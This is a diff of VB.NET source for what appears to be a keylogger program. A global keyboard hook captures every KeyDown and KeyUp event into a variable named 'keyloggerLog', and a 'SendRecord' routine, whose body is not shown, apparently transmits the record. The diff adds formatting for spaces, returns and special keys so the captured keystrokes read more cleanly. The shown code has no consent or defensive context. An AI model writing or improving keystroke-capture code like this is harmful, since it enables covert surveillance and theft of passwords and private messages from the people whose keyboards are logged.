@@ -46,7 +46,6 @@ Public Class Main
             AddToLog("StopRecording@Main", "Error: " & ex.Message, True)
         End Try
     End Sub
-
     Sub SendRecord()
         AddToLog("SendRecord@Main", "Sending record...", False)
         Try
@@ -63,7 +62,6 @@ Public Class Main
             AddToLog("SendRecord@Main", "Error: " & ex.Message, True)
         End Try
     End Sub
-
     Sub ResetRecord()
         AddToLog("ResetRecord@Main", "Resetting record...", False)
         Try
@@ -76,13 +74,23 @@ Public Class Main
     Private Sub kbHook_KeyDown(ByVal Key As Keys) Handles kbHook.KeyDown
         AddKeyToLog(Key.ToString)
     End Sub
-
     Private Sub kbHook_KeyUp(ByVal Key As Keys) Handles kbHook.KeyUp
         AddKeyToLog(Key.ToString)
     End Sub
 
     Sub AddKeyToLog(ByVal key As String)
         If isLoggerSwitch Then
+            Select Case key.ToUpper
+                Case "SPACE"
+                    key = " {" & key.ToUpper & "} "
+                Case "RETURN"
+                    key = "{" & key.ToUpper & "}" & vbCrLf
+                Case Else
+                    Dim isAlphabet = alphabet.ToArray().Any(Function(x) x.ToString().Contains(key))
+                    If Not isAlphabet Then
+                        key = "{" & key.ToUpper & "}"
+                    End If
+            End Select
             keyloggerLog &= key
             'Console.WriteLine(key)
         End If
